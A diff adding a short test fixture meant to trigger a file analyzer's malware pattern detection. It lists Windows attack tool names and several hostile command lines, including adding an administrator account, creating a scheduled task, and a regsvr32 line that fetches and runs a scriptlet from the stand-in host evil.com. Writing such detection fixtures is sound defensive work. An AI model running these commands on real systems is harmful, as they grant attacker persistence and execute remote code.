@@ -1,0 +1,9 @@
+This is a test malware sample file containing suspicious patterns:
+cmd.exe powershell DownloadString Invoke-Expression
+regsvr32 rundll32 wscript cscript mshta
+This file should trigger the file analyzer's pattern detection.
+Additional suspicious patterns:
+- net user administrator /add
+- wmic process call create "cmd.exe /c calc.exe"
+- schtasks /create /tn "malicious_task" /tr "cmd.exe /c echo hacked"
+- regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll
